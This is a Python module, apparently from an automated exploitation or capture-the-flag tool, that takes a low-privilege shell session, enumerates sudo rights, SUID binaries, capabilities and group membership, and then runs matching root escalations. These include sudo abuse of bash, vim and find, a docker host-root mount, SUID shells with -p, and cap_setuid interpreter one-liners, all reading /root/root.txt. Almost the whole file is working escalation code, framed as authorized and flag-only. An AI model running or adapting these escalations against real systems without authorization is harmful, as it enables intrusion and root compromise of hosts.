"""Autonomous, session-driven privilege escalation.

Given a foothold Session (see core/session.py), this runs the privilege-escalation
enumeration *through the session*, parses the output with the existing post-
exploitation parsers, and — for a curated set of high-confidence, easily-scripted
vectors — fires the escalation and proves root by reading /root/root.txt.

Only reached inside the authorized auto-exploit mode. Escalation is bounded to
well-understood vectors that read a root-owned proof file (a flag), not arbitrary
persistence: it demonstrates root, it does not backdoor the host.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

from ..core.session import Session
from ..core.state import Credential, Finding
from .flags import find_flags
from .postexploit import loot

# The enumeration commands run over the session. Bare, portable, read-only.
ENUM_COMMANDS = [
    "id",
    "sudo -n -l 2>/dev/null",
    "uname -a",
    "cat /etc/os-release 2>/dev/null",
    "find / -perm -4000 -type f 2>/dev/null",
    "getcap -r / 2>/dev/null",
    "cat /etc/crontab 2>/dev/null",
]

_ROOT_PROOF = "/root/root.txt"


@dataclass
class EscalationResult:
    escalated: bool
    method: str = ""
    evidence: str = ""
    root_flag: str | None = None
    findings: list[Finding] = field(default_factory=list)
    credentials: list[Credential] = field(default_factory=list)


def run_enum(session: Session, *, runner=None) -> tuple[list[Finding], list[Credential], str]:
    """Run the enum commands over the session and parse the combined output."""
    chunks: list[str] = []
    for cmd in ENUM_COMMANDS:
        out = session.run(cmd, runner=runner)
        chunks.append(f"$ {cmd}\n{out}")
    combined = "\n".join(chunks)
    findings, creds = loot(combined)
    return findings, creds, combined


# --- curated auto-escalations ----------------------------------------------
# A root-file read command per easily-scripted vector. Each proves root by
# printing the proof file; the caller scans the output for a flag.
def _sudo_read_commands() -> dict[str, str]:
    p = _ROOT_PROOF
    return {
        "bash": f"sudo bash -c 'cat {p}'",
        "sh": f"sudo sh -c 'cat {p}'",
        "cat": f"sudo cat {p}",
        "python3": f"sudo python3 -c 'print(open(\"{p}\").read())'",
        "python": f"sudo python -c 'print(open(\"{p}\").read())'",
        "find": f"sudo find {p} -exec cat {{}} +",
        "less": f"sudo less {p}",
        "more": f"sudo more {p}",
        "tail": f"sudo tail {p}",
        "head": f"sudo head {p}",
        "vim": f"sudo vim -c ':!cat {p}' -c ':q' /dev/null",
    }


_GROUP_ESCALATIONS = {
    "docker": f"docker run -v /:/mnt --rm alpine cat /mnt{_ROOT_PROOF} 2>/dev/null",
}
# SUID shells: a root-owned SUID shell is an instant root read via -p.
_SUID_SHELLS = ("bash", "sh", "dash", "ash", "zsh", "ksh")
_SUID_PATH_RE = re.compile(r"^(/\S+)$")

# cap_setuid on a scriptable interpreter -> setuid(0) then read. Keyed by the
# interpreter base name; {PATH} is the exact binary, {P} the proof file.
_CAP_SCRIPTABLE = {
    "python": "{PATH} -c 'import os;os.setuid(0);print(open(\"{P}\").read())'",
    "perl": "{PATH} -e '$>=0;print`cat {P}`'",
    "ruby": "{PATH} -e 'Process::Sys.setuid(0);puts File.read(\"{P}\")'",
    "node": ("{PATH} -e 'process.setuid(0);"
             "console.log(require(\"fs\").readFileSync(\"{P}\",\"utf8\"))'"),
}
_CAPSETUID_RE = re.compile(r"^(/\S+)\s.*cap_setuid", re.IGNORECASE)
_SUDO_ALL_RE = re.compile(r"\(\s*ALL(?:\s*:\s*ALL)?\s*\)\s*(?:NOPASSWD:\s*)?ALL\b", re.IGNORECASE)
_NOPASSWD_BIN_RE = re.compile(r"NOPASSWD:\s*(.+)", re.IGNORECASE)


def attempt_escalation(session: Session, enum_output: str, findings: list[Finding],
                       *, runner=None) -> EscalationResult:
    """Try the curated escalations that match, proving root via /root/root.txt."""
    # 1) Full sudo (ALL) -> read the proof directly.
    if _SUDO_ALL_RE.search(enum_output):
        r = _try(session, f"sudo cat {_ROOT_PROOF}", "full sudo (ALL)", runner)
        if r.escalated:
            return r

    # 2) sudo NOPASSWD on a scriptable binary.
    reads = _sudo_read_commands()
    for m in _NOPASSWD_BIN_RE.findall(enum_output):
        for token in re.split(r"[,\s]+", m):
            binary = token.rsplit("/", 1)[-1].strip()
            if binary in reads:
                r = _try(session, reads[binary], f"sudo NOPASSWD {binary}", runner)
                if r.escalated:
                    return r

    # 3) Dangerous group membership (docker).
    id_line = next((ln for ln in enum_output.splitlines() if "groups=" in ln), "")
    for group, cmd in _GROUP_ESCALATIONS.items():
        if group in id_line.lower():
            r = _try(session, cmd, f"'{group}' group", runner)
            if r.escalated:
                return r

    # 4) A SUID shell (root-owned) -> read the proof with -p (keeps euid=root).
    for line in enum_output.splitlines():
        m = _SUID_PATH_RE.match(line.strip())
        if m and m.group(1).rsplit("/", 1)[-1] in _SUID_SHELLS:
            path = m.group(1)
            r = _try(session, f"{path} -p -c 'cat {_ROOT_PROOF}'",
                     f"SUID {path.rsplit('/', 1)[-1]}", runner)
            if r.escalated:
                return r

    # 5) cap_setuid on a scriptable interpreter -> setuid(0), then read.
    for line in enum_output.splitlines():
        m = _CAPSETUID_RE.match(line.strip())
        if not m:
            continue
        path = m.group(1)
        binary = path.rsplit("/", 1)[-1]
        base = re.sub(r"[\d.]+$", "", binary)   # python3.9 -> python
        tmpl = _CAP_SCRIPTABLE.get(base) or _CAP_SCRIPTABLE.get(binary)
        if tmpl:
            cmd = tmpl.replace("{PATH}", path).replace("{P}", _ROOT_PROOF)
            r = _try(session, cmd, f"cap_setuid on {binary}", runner)
            if r.escalated:
                return r

    return EscalationResult(False, evidence="no auto-escalation vector matched")


def _try(session: Session, command: str, method: str, runner) -> EscalationResult:
    out = session.run(command, runner=runner)
    flags = find_flags(out, include_bare_hex=True)
    if flags:
        return EscalationResult(True, method=method, evidence=out.strip()[:200],
                                root_flag=flags[0])
    # A 32-hex-looking token is the strongest proof, but even a non-error read is a
    # signal; only claim success when we actually recovered a flag-shaped value.
    return EscalationResult(False, method=method, evidence=out.strip()[:200])
